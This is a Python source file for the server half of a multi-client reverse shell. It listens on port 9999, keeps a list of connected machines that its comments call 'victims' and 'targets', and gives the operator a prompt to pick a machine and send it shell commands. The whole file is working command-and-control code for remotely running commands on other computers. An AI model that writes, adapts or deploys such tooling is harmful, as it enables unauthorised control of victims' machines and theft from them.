import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# Create a Socket ( connect two computers )
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("[SERVER CREATION ERROR]" + str(msg))

# Binding the socket and Listening for connection
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port", port)
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("[SERVER BINDING ERROR]" + str(msg) +"\n" + "Returning...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("[CONNECTION ESTABLISHED] " + address[0]) # prints IP address

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        cmd = input('$ ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            connection = get_target(cmd)
            if connection is not None:
                send_target_commands(connection)
        elif 'cmds' in cmd:
            print("list : list connected clients "
                  "\n\t\tINODE\tIP_ADDRESS\tPORT"
                  "\nselect : select any client using INODE number as"
                  "\n\t\tselect INODE")
        else:
            print("Command not recognized. Type 'cmds' to list available commands.")


def list_connections():
    results = ''

    for id, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[id]
            del all_address[id]
            continue

        results = str(id) + "   " + str(all_address[id][0]) + "   " + str(all_address[id][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'exit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


if __name__ == '__main__':
    create_workers()
    create_jobs()